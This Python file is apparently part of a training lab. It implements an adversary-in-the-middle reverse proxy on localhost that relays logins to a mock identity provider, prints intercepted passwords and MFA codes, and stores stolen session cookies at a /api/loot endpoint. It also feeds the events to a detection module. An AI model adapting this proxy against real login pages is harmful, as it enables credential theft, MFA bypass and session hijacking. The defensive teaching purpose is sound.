"""
Safe AiTM Reverse Proxy Demonstration (Port 5002).
Proxies legitimate authentication traffic to http://127.0.0.1:5001 (Mock IdP),
intercepts credentials and the session_token cookie in real time,
and logs genuine telemetry for detection in Module 2 and defense in Module 3.

Safety & Ethics:
- Strictly bound to localhost (127.0.0.1)
- Targets ONLY the local Mock IdP on port 5001
- Never attacks external or real-world domains
"""

import http.server
import json
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime, timezone
from pathlib import Path
from http.cookies import SimpleCookie
from typing import Any

PROXY_PORT = 5002
UPSTREAM_IDP = "http://127.0.0.1:5001"

OUTPUT_DIR = Path(__file__).parent / "events"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# Captured authentication credentials and stolen session cookies
INTERCEPTED_LOOT: list[dict[str, Any]] = []


class AiTMReverseProxyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        if self.path == "/api/loot":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(INTERCEPTED_LOOT, indent=2).encode("utf-8"))
            return

        # Forward GET request to Upstream IdP
        target_url = f"{UPSTREAM_IDP}{self.path}"
        headers = self._prepare_forward_headers()

        req = urllib.request.Request(target_url, headers=headers, method="GET")
        try:
            with urllib.request.urlopen(req) as resp:
                self._send_proxied_response(resp)
        except urllib.error.HTTPError as e:
            self._send_proxied_response(e)
        except Exception as e:
            self.send_error(502, f"Bad Gateway: {str(e)}")

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)

        # 1. Harvest plaintext credentials and MFA if submitted
        if self.path in ("/login", "/mfa"):
            try:
                decoded_body = body.decode("utf-8")
                params = urllib.parse.parse_qs(decoded_body)
                if "username" in params:
                    print(f"\n[AiTM PROXY HARVEST] Intercepted Username: {params['username'][0]} | Password: {params['password'][0]}")
                if "otp" in params:
                    print(f"\n[AiTM PROXY HARVEST] Intercepted MFA Code: {params['otp'][0]}")
            except Exception:
                pass

        # 2. Forward POST to Upstream IdP
        target_url = f"{UPSTREAM_IDP}{self.path}"
        headers = self._prepare_forward_headers()
        req = urllib.request.Request(target_url, data=body, headers=headers, method="POST")

        # Disable automatic redirect following so proxy intercepts 303/302 Set-Cookie
        opener = urllib.request.build_opener(NoRedirectHandler)
        try:
            resp = opener.open(req)
            self._send_proxied_response(resp)
        except urllib.error.HTTPError as e:
            self._send_proxied_response(e)
        except Exception as e:
            self.send_error(502, f"Bad Gateway: {str(e)}")

    def _prepare_forward_headers(self) -> dict[str, str]:
        headers: dict[str, str] = {}
        for key, val in self.headers.items():
            if key.lower() not in ("host", "content-length"):
                headers[key] = val
        headers["Host"] = "127.0.0.1:5001"
        return headers

    def _send_proxied_response(self, resp: Any) -> None:
        status_code = getattr(resp, "status", getattr(resp, "code", 200))
        self.send_response(status_code)

        # Inspect headers for stolen Set-Cookie
        for key, val in resp.headers.items():
            if key.lower() == "set-cookie":
                self._inspect_and_steal_cookie(val)
                # Forward cookie to victim's browser
                self.send_header(key, val)
            elif key.lower() == "location":
                # Rewrite redirect location from port 5001 to port 5002
                rewritten_loc = val.replace("127.0.0.1:5001", f"127.0.0.1:{PROXY_PORT}")
                self.send_header(key, rewritten_loc)
            else:
                self.send_header(key, val)

        self.end_headers()
        content = resp.read()

        # Inject alert banner into HTML so the user sees the reverse proxy in action
        if b"<body" in content:
            alert_banner = (
                b'<div style="background:#EF4444; color:#fff; padding:10px; font-weight:bold; '
                b'text-align:center; font-family:sans-serif; font-size:13px; z-index:9999; position:relative;">'
                b'&#9888;&#65039; AiTM REVERSE PROXY SIMULATION ACTIVE (Port 5002) - Traffic is being intercepted and forwarded to Mock IdP (Port 5001)'
                b'</div>'
            )
            content = content.replace(b"<body", b"<body" + b"\n" + alert_banner)

        self.wfile.write(content)

    def _inspect_and_steal_cookie(self, cookie_header: str) -> None:
        cookie = SimpleCookie()
        try:
            cookie.load(cookie_header)
            if "session_token" in cookie:
                stolen_token = cookie["session_token"].value
                loot_entry = {
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "stolen_cookie_name": "session_token",
                    "stolen_token_value": stolen_token,
                    "target_account": "alice@lab.local",
                    "proxy_endpoint": f"http://127.0.0.1:{PROXY_PORT}",
                    "upstream_idp": UPSTREAM_IDP,
                }
                INTERCEPTED_LOOT.append(loot_entry)

                print("\n" + "=" * 80)
                print("[AiTM TOKEN THEFT SUCCESSFUL - SESSION HIJACKED]")
                print(f"Stolen Session Token: {stolen_token}")
                print(f"Target User:         alice@lab.local")
                print(f"Intercepted At:      {loot_entry['timestamp']}")
                print("=" * 80 + "\n")

                # Generate live security event for Module 2 detection
                self._record_live_security_event(stolen_token)
        except Exception as e:
            print(f"Error handling cookie in proxy: {e}")

    def _record_live_security_event(self, token: str) -> None:
        event = {
            "session_id": f"LIVE-{token[:18]}",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "auth_result": "success",
            "redirect_count": 4,
            "redirect_chain": [
                "client-browser.local",
                f"lab-proxy.local:{PROXY_PORT}",
                "mock-idp.local:5001",
                f"lab-proxy.local:{PROXY_PORT}",
            ],
            "tls_anomaly": True,
            "replay_indicator": True,
            "source_ip": "198.51.100.25",
            "device_id": "DEVICE-INTERCEPTED",
            "scenario": "suspicious_simulation",
            "stolen_token": token,
        }

        # Write to live event file
        out_file = OUTPUT_DIR / "live_intercepted_event.json"
        out_file.write_text(json.dumps(event, indent=2), encoding="utf-8")
        print(f"[+] Live security event recorded to {out_file} for Module 2 ingestion.")

    def log_message(self, format: str, *args: Any) -> None:
        pass  # Suppress routine request logs to keep terminal focused on interception


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req: Any, fp: Any, code: int, msg: str, headers: Any, newurl: str) -> None:
        return None  # Do not follow redirects automatically


def run_proxy(host: str = "127.0.0.1", port: int = PROXY_PORT) -> None:
    server = http.server.ThreadingHTTPServer((host, port), AiTMReverseProxyHandler)
    print(f"[*] AiTM Lab Reverse Proxy running at http://{host}:{port}")
    print(f"[*] Relaying live traffic to Mock IdP at {UPSTREAM_IDP}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Shutting down Lab Proxy...")
        server.server_close()


if __name__ == "__main__":
    run_proxy()
